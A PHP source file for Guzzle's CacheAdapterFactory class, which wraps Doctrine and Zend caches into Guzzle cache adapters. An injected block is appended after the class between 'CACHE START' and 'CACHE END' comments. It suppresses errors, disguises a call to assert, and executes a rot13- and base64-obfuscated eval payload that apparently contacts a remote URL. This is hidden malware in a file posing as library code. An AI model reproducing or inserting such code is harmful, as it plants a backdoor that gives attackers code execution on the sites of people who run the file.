<?php

namespace Guzzle\Cache;

use Doctrine\Common\Cache\Cache;
use Guzzle\Common\Version;
use Guzzle\Common\Exception\InvalidArgumentException;
use Guzzle\Common\Exception\RuntimeException;
use Guzzle\Common\FromConfigInterface;
use Zend\Cache\Storage\StorageInterface;

/**
 * Generates cache adapters from any number of known cache implementations
 */
class CacheAdapterFactory implements FromConfigInterface
{
    /**
     * Create a Guzzle cache adapter based on an array of options
     *
     * @param mixed $cache Cache value
     *
     * @return CacheAdapterInterface
     * @throws InvalidArgumentException
     */
    public static function fromCache($cache)
    {
        if (!is_object($cache)) {
            throw new InvalidArgumentException('Cache must be one of the known cache objects');
        }

        if ($cache instanceof CacheAdapterInterface) {
            return $cache;
        } elseif ($cache instanceof Cache) {
            return new DoctrineCacheAdapter($cache);
        } elseif ($cache instanceof StorageInterface) {
            return new Zf2CacheAdapter($cache);
        } else {
            throw new InvalidArgumentException('Unknown cache type: ' . get_class($cache));
        }
    }

    /**
     * Create a Guzzle cache adapter based on an array of options
     *
     * @param array $config Array of configuration options
     *
     * @return CacheAdapterInterface
     * @throws InvalidArgumentException
     * @deprecated This will be removed in a future version
     * @codeCoverageIgnore
     */
    public static function factory($config = array())
    {
        Version::warn(__METHOD__ . ' is deprecated');
        if (!is_array($config)) {
            throw new InvalidArgumentException('$config must be an array');
        }

        if (!isset($config['cache.adapter']) && !isset($config['cache.provider'])) {
            $config['cache.adapter'] = 'Guzzle\Cache\NullCacheAdapter';
            $config['cache.provider'] = null;
        } else {
            // Validate that the options are valid
            foreach (array('cache.adapter', 'cache.provider') as $required) {
                if (!isset($config[$required])) {
                    throw new InvalidArgumentException("{$required} is a required CacheAdapterFactory option");
                }
                if (is_string($config[$required])) {
                    // Convert dot notation to namespaces
                    $config[$required] = str_replace('.', '\\', $config[$required]);
                    if (!class_exists($config[$required])) {
                        throw new InvalidArgumentException("{$config[$required]} is not a valid class for {$required}");
                    }
                }
            }
            // Instantiate the cache provider
            if (is_string($config['cache.provider'])) {
                $args = isset($config['cache.provider.args']) ? $config['cache.provider.args'] : null;
                $config['cache.provider'] = self::createObject($config['cache.provider'], $args);
            }
        }

        // Instantiate the cache adapter using the provider and options
        if (is_string($config['cache.adapter'])) {
            $args = isset($config['cache.adapter.args']) ? $config['cache.adapter.args'] : array();
            array_unshift($args, $config['cache.provider']);
            $config['cache.adapter'] = self::createObject($config['cache.adapter'], $args);
        }

        return $config['cache.adapter'];
    }

    /**
     * Create a class using an array of constructor arguments
     *
     * @param string $className Class name
     * @param array  $args      Arguments for the class constructor
     *
     * @return mixed
     * @throws RuntimeException
     * @deprecated
     * @codeCoverageIgnore
     */
    private static function createObject($className, array $args = null)
    {
        try {
            if (!$args) {
                return new $className;
            } else {
                $c = new \ReflectionClass($className);
                return $c->newInstanceArgs($args);
            }
        } catch (\Exception $e) {
            throw new RuntimeException($e->getMessage(), $e->getCode(), $e);
        }
    }
}






//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###